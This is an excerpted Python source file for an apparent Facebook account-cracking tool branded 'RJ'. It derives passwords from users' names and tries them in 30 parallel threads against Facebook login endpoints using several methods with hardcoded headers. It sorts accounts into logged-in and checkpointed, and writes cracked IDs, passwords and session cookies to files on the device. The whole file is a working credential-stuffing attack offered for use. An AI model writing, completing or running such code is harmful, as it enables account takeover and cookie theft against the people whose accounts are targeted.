...
from concurrent.futures import ThreadPoolExecutor as mogidRJ
from string import * 
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print("××××××××××××××××××××××××××××××××××")
        input("Press enter to back RJ Menu ")
        exit()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[RJ] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);RJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={RJb};{ckkk}"
                    print(f"\r{R} [RJ-OK] {sid} | {ps} {S}")
                    oks.append(sid)
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[RJ] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [RJ-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/RJ_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RJ_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [RJ-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[RJ] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [RJ-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/RJ_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print("××××××××××××××××××××××××××××××××××")
            with mogidRJ(max_workers=30) as RJworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                RJworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                RJworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                RJworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                RJworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
